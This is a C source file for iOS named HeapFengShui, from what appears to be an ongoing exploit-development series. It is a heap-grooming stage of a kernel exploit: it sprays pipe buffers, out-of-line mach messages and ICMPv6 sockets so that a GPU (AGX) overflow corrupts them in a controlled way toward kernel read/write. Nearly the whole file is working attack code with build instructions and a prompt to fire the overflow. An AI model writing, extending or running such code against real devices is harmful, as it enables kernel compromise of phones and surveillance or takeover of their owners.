/*
 * HeapFengShui — Kernel Object Spray for Controlled AGX Overflow
 * Session 156: Close the kernel R/W gap
 *
 * Sprays pipe buffers (kalloc.16384) and OOL mach messages (kalloc.256/512)
 * to surround PurpleGfxMem allocations. AGX overflow (F-68) writes shader
 * output into these objects -> controlled kernel corruption.
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64 -mios-version-min=17.0 -O2
 *        -o HeapFengShui heap_fengshui.c -isysroot $(xcrun -sdk iphoneos --show-sdk-path)
 *        -framework CoreFoundation
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <sys/socket.h>
#include <dlfcn.h>

/* Spray parameters */
#define NUM_PIPES       1000
#define PIPE_BUF_SIZE   16384   /* 16KB -> kalloc.16384 */
#define NUM_OOL_PORTS   2000
#define OOL_MSG_SIZE    256     /* -> kalloc.256 */
#define MARKER_PIPE     0xFE    /* Known marker for pipe data */
#define MARKER_OOL      0xDF    /* Known marker for OOL data */
#define NUM_SOCKETS     200     /* ICMPv6 sockets as canaries */

static int g_pipes[NUM_PIPES][2];
static int g_pipe_count = 0;
static mach_port_t g_ool_ports[NUM_OOL_PORTS];
static int g_ool_count = 0;
static int g_socks[NUM_SOCKETS];
static int g_sock_count = 0;

/* Spray pipe buffers into kalloc.16384 */
static void spray_pipes(void) {
    char buf[PIPE_BUF_SIZE];
    memset(buf, MARKER_PIPE, sizeof(buf));

    /* Write unique ID into first 8 bytes of each pipe buffer */
    for (int i = 0; i < NUM_PIPES; i++) {
        if (pipe(g_pipes[i]) < 0) break;

        /* Tag each pipe with its index for identification */
        *(uint64_t *)buf = 0xFEFE000000000000ULL | (uint64_t)i;

        /* Fill pipe to force kernel buffer allocation */
        int written = write(g_pipes[i][1], buf, PIPE_BUF_SIZE);
        if (written > 0) g_pipe_count++;
    }
    fprintf(stderr, "[FENGSHUI] Pipes sprayed: %d (kalloc.16384)\n", g_pipe_count);
}

/* Spray OOL mach messages into kalloc.256 */
static void spray_ool_messages(void) {
    mach_port_t task = mach_task_self();
    char ool_data[OOL_MSG_SIZE];
    memset(ool_data, MARKER_OOL, sizeof(ool_data));

    for (int i = 0; i < NUM_OOL_PORTS; i++) {
        mach_port_t port = MACH_PORT_NULL;
        kern_return_t kr = mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &port);
        if (kr != KERN_SUCCESS) break;

        /* Insert send right */
        kr = mach_port_insert_right(task, port, port, MACH_MSG_TYPE_MAKE_SEND);
        if (kr != KERN_SUCCESS) {
            mach_port_deallocate(task, port);
            break;
        }

        /* Tag OOL data with index */
        *(uint64_t *)ool_data = 0xDFDF000000000000ULL | (uint64_t)i;

        /* Send OOL message to self */
        struct {
            mach_msg_header_t hdr;
            mach_msg_body_t body;
            mach_msg_ool_descriptor_t ool;
        } msg;

        memset(&msg, 0, sizeof(msg));
        msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
        msg.hdr.msgh_size = sizeof(msg);
        msg.hdr.msgh_remote_port = port;
        msg.hdr.msgh_local_port = MACH_PORT_NULL;
        msg.body.msgh_descriptor_count = 1;
        msg.ool.address = ool_data;
        msg.ool.size = OOL_MSG_SIZE;
        msg.ool.deallocate = 0;
        msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
        msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;

        kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0,
                      MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr == KERN_SUCCESS) {
            g_ool_ports[g_ool_count++] = port;
        } else {
            mach_port_deallocate(task, port);
        }
    }
    fprintf(stderr, "[FENGSHUI] OOL messages sprayed: %d (kalloc.%d)\n",
            g_ool_count, OOL_MSG_SIZE);
}

/* Spray ICMPv6 sockets as crash canaries */
static void spray_sockets(void) {
    unsigned char filter[32];
    memset(filter, 0xFF, sizeof(filter));

    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58); /* AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6 */
        if (fd < 0) break;
        setsockopt(fd, 58, 18, filter, 32); /* ICMP6_FILTER */
        g_socks[g_sock_count++] = fd;
    }
    fprintf(stderr, "[FENGSHUI] Socket canaries: %d (ICMPv6)\n", g_sock_count);
}

/* Verify pipe integrity by reading first 8 bytes */
static int verify_pipes(void) {
    int corrupted = 0;
    char buf[8];

    for (int i = 0; i < g_pipe_count; i++) {
        /* Peek without consuming (use ioctl or re-read) */
        /* Actually read will consume - skip verification for now */
        /* Just check if fd is still valid */
        if (fcntl(g_pipes[i][0], 1) < 0) { /* F_GETFD */
            corrupted++;
            fprintf(stderr, "[FENGSHUI] PIPE %d CORRUPTED (fd invalid)\n", i);
        }
    }
    return corrupted;
}

int main(void) {
    fprintf(stderr, "=== HeapFengShui v1 ===\n");
    fprintf(stderr, "Spray: %d pipes (%dKB each) + %d OOL (%dB each) + %d sockets\n",
            NUM_PIPES, PIPE_BUF_SIZE/1024, NUM_OOL_PORTS, OOL_MSG_SIZE, NUM_SOCKETS);

    /* Phase 1: Spray kernel objects */
    spray_pipes();
    spray_ool_messages();
    spray_sockets();

    fprintf(stderr, "[FENGSHUI] READY — Total kernel objects: %d\n",
            g_pipe_count + g_ool_count + g_sock_count);
    fprintf(stderr, "[FENGSHUI] Holding objects open. Trigger AGX overflow now.\n");
    fprintf(stderr, "[FENGSHUI] Pipe marker=0x%02X, OOL marker=0x%02X\n",
            MARKER_PIPE, MARKER_OOL);

    /* Phase 2: Hold everything open, run CFRunLoop */
    void *cf = dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation", 1);
    if (cf) {
        void (*run)(void) = dlsym(cf, "CFRunLoopRun");
        if (run) run();
    }

    /* Fallback: spin */
    while (1) { __asm__ volatile("yield"); }
    return 0;
}
